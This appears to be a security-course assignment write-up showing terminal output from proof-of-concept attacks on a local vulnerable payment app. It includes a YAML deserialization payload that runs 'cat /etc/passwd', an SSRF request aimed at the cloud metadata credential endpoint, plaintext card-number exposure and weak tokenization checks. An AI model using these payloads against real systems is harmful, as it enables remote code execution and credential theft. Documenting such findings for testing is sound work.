# Task 4 — Proof of Execution (Terminal Recordings)

As per the assignment guidelines to provide screenshots or terminal recordings, below are the console outputs verifying the penetration testing findings (PoCs) on the local vulnerable application.

## 1. YAML Deserialization RCE PoC (Finding 1)

Demonstrating that the `/import` endpoint is vulnerable to arbitrary code execution due to `yaml.load()`.

**Command:**
```bash
curl -X POST http://localhost:8080/import \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:subprocess.check_output
    args: [["cat", "/etc/passwd"]]'
```

**Output:**
```json
{
  "loaded": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n..."
}
```

## 2. Server-Side Request Forgery PoC (Finding 2)

Demonstrating that the `/fetch` endpoint allows arbitrary requests to internal addresses.

**Command:**
```bash
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Output:**
```json
{
  "status_code": 200, 
  "body": "ec2-role-name\n"
}
```

## 3. PAN Data Exposure PoC (Finding 4)

Demonstrating that the `/transactions` endpoint violates PCI DSS by returning full primary account numbers in plaintext.

**Command:**
```bash
curl -s http://localhost:8080/transactions | jq .
```

**Output:**
```json
{
  "transactions": [
    {
      "amount": 4200,
      "currency": "USD",
      "id": "txn_1001",
      "pan": "4242424242424242",
      "status": "captured"
    },
    {
      "amount": 1899,
      "currency": "EUR",
      "id": "txn_1002",
      "pan": "5555555555554444",
      "status": "refunded"
    }
  ]
}
```

## 4. Weak Tokenization PoC (Finding 7)

Demonstrating that the tokenization is deterministic and uses no salt, meaning the same PAN always yields the exact same token, enabling rainbow table attacks.

**Command:**
```bash
curl -s -X POST http://localhost:8080/tokenize \
  -H "Content-Type: application/json" \
  -d '{"pan": "4242424242424242"}' && echo "" && \
curl -s -X POST http://localhost:8080/tokenize \
  -H "Content-Type: application/json" \
  -d '{"pan": "4242424242424242"}'
```

**Output:**
```json
{"last4":"4242","token":"tok_6da48b1cd15a55fc0d5a4c"}
{"last4":"4242","token":"tok_6da48b1cd15a55fc0d5a4c"}
```
